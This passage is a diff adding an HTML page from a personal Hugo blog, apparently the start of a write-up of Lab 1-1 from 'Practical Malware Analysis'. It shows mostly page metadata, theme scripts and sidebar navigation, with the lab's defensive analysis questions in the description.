@@ -1,0 +1,1622 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+<link rel="icon" href="/favicon-dark.svg" type="image/svg+xml" media="(prefers-color-scheme: dark)" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>Lab – C65mael</title>
+  <meta name="description" content="《恶意代码分析实战》的实验 Lab 1-1 ---------------- Lab01-01.exe Lab01-01.dll ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 实验内容： 1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？ 2、这些文件是什么时候编译的？ 3、这两个文件中是否存在迹象说明他们是否被加壳或混淆了？如果是，这些迹象在哪里？ 4、是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？ 5、是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？ 6、是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？ 7、你猜这些文件的目的是干什么的？ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ![image](https://c65mael.github.io/myassets-Lab/1-1 1.png)
+![image](https://c65mael.github.io/myassets-Lab/1-1 2.png)
+通过pe工具查看时间戳，发现两个文件的编译时间：
+![image](https://c65mael.github.io/myassets-Lab/1-1 3.png)" /><link rel="canonical" href="http://localhost:1313/docs/remaining/2024-7-10-lab/" itemprop="url" />
+
+<meta property="og:title" content="Lab" />
+<meta property="og:description" content="《恶意代码分析实战》的实验
+    Lab 1-1
+    
+
+----------------
+Lab01-01.exe
+Lab01-01.dll
+----------------
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+实验内容：
+1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？
+2、这些文件是什么时候编译的？
+3、这两个文件中是否存在迹象说明他们是否被加壳或混淆了？如果是，这些迹象在哪里？
+4、是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？
+5、是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？
+6、是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？
+7、你猜这些文件的目的是干什么的？
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+  
+    
+    
+  
+
+
+
+
+![image](https://c65mael.github.io/myassets-Lab/1-1 1.png)
+![image](https://c65mael.github.io/myassets-Lab/1-1 2.png)
+
+
+通过pe工具查看时间戳，发现两个文件的编译时间：
+![image](https://c65mael.github.io/myassets-Lab/1-1 3.png)" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/docs/remaining/2024-7-10-lab/" /><meta property="article:section" content="docs" />
+
+
+
+  <meta itemprop="name" content="Lab">
+  <meta itemprop="description" content="《恶意代码分析实战》的实验 Lab 1-1 ---------------- Lab01-01.exe Lab01-01.dll ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 实验内容： 1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？ 2、这些文件是什么时候编译的？ 3、这两个文件中是否存在迹象说明他们是否被加壳或混淆了？如果是，这些迹象在哪里？ 4、是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？ 5、是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？ 6、是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？ 7、你猜这些文件的目的是干什么的？ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ![image](https://c65mael.github.io/myassets-Lab/1-1 1.png)
+![image](https://c65mael.github.io/myassets-Lab/1-1 2.png)
+通过pe工具查看时间戳，发现两个文件的编译时间：
+![image](https://c65mael.github.io/myassets-Lab/1-1 3.png)">
+  <meta itemprop="wordCount" content="1140">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Lab">
+  <meta name="twitter:description" content="《恶意代码分析实战》的实验 Lab 1-1 ---------------- Lab01-01.exe Lab01-01.dll ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 实验内容： 1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？ 2、这些文件是什么时候编译的？ 3、这两个文件中是否存在迹象说明他们是否被加壳或混淆了？如果是，这些迹象在哪里？ 4、是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？ 5、是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？ 6、是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？ 7、你猜这些文件的目的是干什么的？ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ![image](https://c65mael.github.io/myassets-Lab/1-1 1.png)
+![image](https://c65mael.github.io/myassets-Lab/1-1 2.png)
+通过pe工具查看时间戳，发现两个文件的编译时间：
+![image](https://c65mael.github.io/myassets-Lab/1-1 3.png)">
+
+    <link href="/css/compiled/main.css" rel="stylesheet" />
+
+
+
+  <link href="/css/custom.css" rel="stylesheet" />
+
+
+  <script>
+     
+    const defaultTheme = 'system';
+
+    const setDarkTheme = () => {
+      document.documentElement.classList.add("dark");
+      document.documentElement.style.colorScheme = "dark";
+    }
+    const setLightTheme = () => {
+      document.documentElement.classList.remove("dark");
+      document.documentElement.style.colorScheme = "light";
+    }
+
+    if ("color-theme" in localStorage) {
+      localStorage.getItem("color-theme") === "dark" ? setDarkTheme() : setLightTheme();
+    } else {
+      defaultTheme === "dark" ? setDarkTheme() : setLightTheme();
+      if (defaultTheme === "system") {
+        window.matchMedia("(prefers-color-scheme: dark)").matches ? setDarkTheme() : setLightTheme();
+      }
+    }
+  </script>
+
+  
+</head>
+<body dir="ltr"><div class="nav-container hx-sticky hx-top-0 hx-z-20 hx-w-full hx-bg-transparent print:hx-hidden">
+  <div class="nav-container-blur hx-pointer-events-none hx-absolute hx-z-[-1] hx-h-full hx-w-full hx-bg-white dark:hx-bg-dark hx-shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] contrast-more:hx-shadow-[0_0_0_1px_#000] dark:hx-shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] contrast-more:dark:hx-shadow-[0_0_0_1px_#fff]"></div>
+
+  <nav class="hx-mx-auto hx-flex hx-items-center hx-justify-end hx-gap-2 hx-h-16 hx-px-6 hx-max-w-[90rem]">
+    <a class="hx-flex hx-items-center hover:hx-opacity-75 ltr:hx-mr-auto rtl:hx-ml-auto" href="/">
+        <img class="hx-mr-2 hx-block dark:hx-hidden" src="/images/logo.svg" alt="C65mael" height="20" width="20" />
+        <img class="hx-mr-2 hx-hidden dark:hx-block" src="/images/logo.svg" alt="C65mael" height="20" width="20" />
+        <span class="hx-mr-2 hx-font-extrabold hx-inline hx-select-none" title="C65mael">C65mael</span>
+    </a><a
+            title="文档"
+            href="/docs"
+            
+            class="hx-text-sm contrast-more:hx-text-gray-700 contrast-more:dark:hx-text-gray-100 hx-relative -hx-ml-2 hx-hidden hx-whitespace-nowrap hx-p-2 md:hx-inline-block hx-font-medium"
+          >
+            <span class="hx-text-center">文档</span>
+          </a><a
+            title="博客"
+            href="/blog"
+            
+            class="hx-text-sm contrast-more:hx-text-gray-700 contrast-more:dark:hx-text-gray-100 hx-relative -hx-ml-2 hx-hidden hx-whitespace-nowrap hx-p-2 md:hx-inline-block hx-text-gray-600 hover:hx-text-gray-800 dark:hx-text-gray-400 dark:hover:hx-text-gray-200"
+          >
+            <span class="hx-text-center">博客</span>
+          </a><a
+            title="关于"
+            href="/about"
+            
+            class="hx-text-sm contrast-more:hx-text-gray-700 contrast-more:dark:hx-text-gray-100 hx-relative -hx-ml-2 hx-hidden hx-whitespace-nowrap hx-p-2 md:hx-inline-block hx-text-gray-600 hover:hx-text-gray-800 dark:hx-text-gray-400 dark:hover:hx-text-gray-200"
+          >
+            <span class="hx-text-center">关于</span>
+          </a><div class="search-wrapper hx-relative md:hx-w-64">
+  <div class="hx-relative hx-flex hx-items-center hx-text-gray-900 contrast-more:hx-text-gray-800 dark:hx-text-gray-300 contrast-more:dark:hx-text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input hx-block hx-w-full hx-appearance-none hx-rounded-lg hx-px-3 hx-py-2 hx-transition-colors hx-text-base hx-leading-tight md:hx-text-sm hx-bg-black/[.05] dark:hx-bg-gray-50/10 focus:hx-bg-white dark:focus:hx-bg-dark placeholder:hx-text-gray-500 dark:placeholder:hx-text-gray-400 contrast-more:hx-border contrast-more:hx-border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx-absolute hx-my-1.5 hx-select-none ltr:hx-right-1.5 rtl:hx-left-1.5 hx-h-5 hx-rounded hx-bg-white hx-px-1.5 hx-font-mono hx-text-[10px] hx-font-medium hx-text-gray-500 hx-border dark:hx-border-gray-100/20 dark:hx-bg-dark/50 contrast-more:hx-border-current contrast-more:hx-text-current contrast-more:dark:hx-border-current hx-items-center hx-gap-1 hx-transition-opacity hx-pointer-events-none hx-hidden sm:hx-flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hx-hidden hx-border hx-border-gray-200 hx-bg-white hx-text-gray-100 dark:hx-border-neutral-800 dark:hx-bg-neutral-900 hx-absolute hx-top-full hx-z-20 hx-mt-2 hx-overflow-auto hx-overscroll-contain hx-rounded-xl hx-py-2.5 hx-shadow-xl hx-max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] md:hx-max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx-inset-x-0 ltr:md:hx-left-auto rtl:md:hx-right-auto contrast-more:hx-border contrast-more:hx-border-gray-900 contrast-more:dark:hx-border-gray-50 hx-w-screen hx-min-h-[100px] hx-max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+          <a class="hx-p-2 hx-text-current" target="_blank" rel="noreferrer" href="https://github.com/imfing/hextra" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="hx-sr-only">GitHub</span>
+          </a><button type="button" aria-label="Menu" class="hamburger-menu -hx-mr-2 hx-rounded hx-p-2 active:hx-bg-gray-400/20 md:hx-hidden"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class='hx-mx-auto hx-flex hx-max-w-screen-xl'>
+    <div class="mobile-menu-overlay [transition:background-color_1.5s_ease] hx-fixed hx-inset-0 hx-z-10 hx-bg-black/80 dark:hx-bg-black/60 hx-hidden"></div>
+<aside class="sidebar-container hx-flex hx-flex-col print:hx-hidden md:hx-top-16 md:hx-shrink-0 md:hx-w-64 md:hx-self-start max-md:[transform:translate3d(0,-100%,0)] md:hx-sticky">
+  
+  <div class="hx-px-4 hx-pt-4 md:hx-hidden">
+    <div class="search-wrapper hx-relative md:hx-w-64">
+  <div class="hx-relative hx-flex hx-items-center hx-text-gray-900 contrast-more:hx-text-gray-800 dark:hx-text-gray-300 contrast-more:dark:hx-text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input hx-block hx-w-full hx-appearance-none hx-rounded-lg hx-px-3 hx-py-2 hx-transition-colors hx-text-base hx-leading-tight md:hx-text-sm hx-bg-black/[.05] dark:hx-bg-gray-50/10 focus:hx-bg-white dark:focus:hx-bg-dark placeholder:hx-text-gray-500 dark:placeholder:hx-text-gray-400 contrast-more:hx-border contrast-more:hx-border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx-absolute hx-my-1.5 hx-select-none ltr:hx-right-1.5 rtl:hx-left-1.5 hx-h-5 hx-rounded hx-bg-white hx-px-1.5 hx-font-mono hx-text-[10px] hx-font-medium hx-text-gray-500 hx-border dark:hx-border-gray-100/20 dark:hx-bg-dark/50 contrast-more:hx-border-current contrast-more:hx-text-current contrast-more:dark:hx-border-current hx-items-center hx-gap-1 hx-transition-opacity hx-pointer-events-none hx-hidden sm:hx-flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hx-hidden hx-border hx-border-gray-200 hx-bg-white hx-text-gray-100 dark:hx-border-neutral-800 dark:hx-bg-neutral-900 hx-absolute hx-top-full hx-z-20 hx-mt-2 hx-overflow-auto hx-overscroll-contain hx-rounded-xl hx-py-2.5 hx-shadow-xl hx-max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] md:hx-max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx-inset-x-0 ltr:md:hx-left-auto rtl:md:hx-right-auto contrast-more:hx-border contrast-more:hx-border-gray-900 contrast-more:dark:hx-border-gray-50 hx-w-screen hx-min-h-[100px] hx-max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+  </div>
+  <div class="hextra-scrollbar hx-overflow-y-auto hx-overflow-x-hidden hx-p-4 hx-grow md:hx-h-[calc(100vh-var(--navbar-height)-var(--menu-height))]">
+    <ul class="hx-flex hx-flex-col hx-gap-1 md:hx-hidden">
+      
+      
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/about/"
+    
+  >About
+    </a></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/"
+    
+  >Blog
+    </a></li>
+          <li class="open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/"
+    
+  >Docs
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/crack/"
+    
+  >Crack
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a>
+              <div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/crack/crack/"
+    
+  >Crack
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/crack/crackext/"
+    
+  >CrackEXT
+    </a>
+              
+            </li></ul>
+      </div>
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/homework/"
+    
+  >Homework
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a>
+              <div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/homework/crack-homework/"
+    
+  >Crack-homework
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/homework/homework/"
+    
+  >Homework
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/homework/homeworkbas/"
+    
+  >HomeworkBAS
+    </a>
+              
+            </li></ul>
+      </div>
+            </li><li class="hx-flex hx-flex-col open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/"
+    
+  >Remaining
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a>
+              <div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/ai/"
+    
+  >AI
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/app/"
+    
+  >APP
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/apts/"
+    
+  >APTs
+    </a>
+              
